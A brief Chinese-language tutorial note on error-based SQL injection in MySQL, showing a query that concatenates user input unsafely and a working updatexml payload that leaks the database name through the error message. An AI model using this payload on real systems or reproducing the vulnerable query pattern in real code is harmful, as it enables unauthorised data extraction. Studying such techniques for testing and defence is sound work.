# 报错注入
报错注入在没法用union联合查询注入时用，但前提还是不能过滤一些关键的函数
报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中
~~~sql
适用于mysql 5.1.5版本以上
函数语法:updatexml(XML_document，XPath_string，new_value);
updatexml是由于参数的格式不正确而产生的错误，同样也会返回参数的信息


# 直接拼接查询的字段user_id
select first_name, last_name from users where user_id = '$id';

# 输入的user_id是 1' and updatexml(1,concat(0x7e,(select database()),0x7e),1) #
# updatexml的XPath_string参数前后添加~（0x7e）使其不符合xpath格式从而报错，标准错误会打印执行select database()的结果也就是可以获取当前数据库名称（注意结果也是使用~前后包裹的），同理可以替换为其他的sql执行打印结果
~~~
